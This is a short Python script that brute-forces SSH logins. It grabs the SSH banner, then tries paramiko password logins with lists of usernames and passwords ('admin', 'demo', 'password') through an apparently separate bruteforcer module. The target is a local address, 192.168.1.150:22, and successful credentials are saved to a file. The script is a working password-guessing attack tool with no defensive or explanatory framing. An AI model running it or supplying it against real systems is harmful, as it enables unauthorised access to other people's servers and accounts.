import paramiko			# pip3 install paramiko
import socket
import time



def attempt_fx(input_dict):

	def grab_banner(ip_address, port):
		try:
			s = socket.socket()
			s.settimeout(60)
			s.connect((ip_address, port))
			banner = s.recv(1024)
			s.close()
			return banner

		except:
			return None


	retry_delay = 5

	username = input_dict.get("username")
	password = input_dict.get("password")
	destination = input_dict.get("destination").split(":")

	ip = destination[0]
	port = int(destination[1])


	banner = grab_banner(ip, port)

	if (type(banner) == bytes):
		try:	banner = banner.decode("utf-8")
		except: banner = str(banner)

	if ((banner == None) or (type(banner) == int) or (not "SSH" in banner)):
		print ("[!] Banner grabbing failed for " + str(destination) + ": " + str(banner))
		return False


	for i in range(0, 5):			# 5 retry 
		try:
			client = paramiko.SSHClient()
			client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

			client.connect(hostname=ip, port=port, username=username, password=password, look_for_keys=False, allow_agent=False, timeout=120)

			return True


		except socket.timeout:
			print ("[EX]: socket.timeout, retry in " + str(retry_delay) + " seconds...")
			time.sleep(retry_delay)
			continue

		except paramiko.AuthenticationException:
			return False			# Failed

		except:
			return False


	return False




###################################################################################################################



import bruteforcer

number_threads = 1
variables_dict = { "username": ["admin", "bill", "user", "demo"], "password": ["demo", "safe", "password"], "destination":"192.168.1.150:22" }

b = bruteforcer.Bruteforcer(number_threads, variables_dict, attempt_fx, stop_on_success=False, successful_attempts_filename="successful_attempts.txt")
b.run()
b.kill_all_threads()
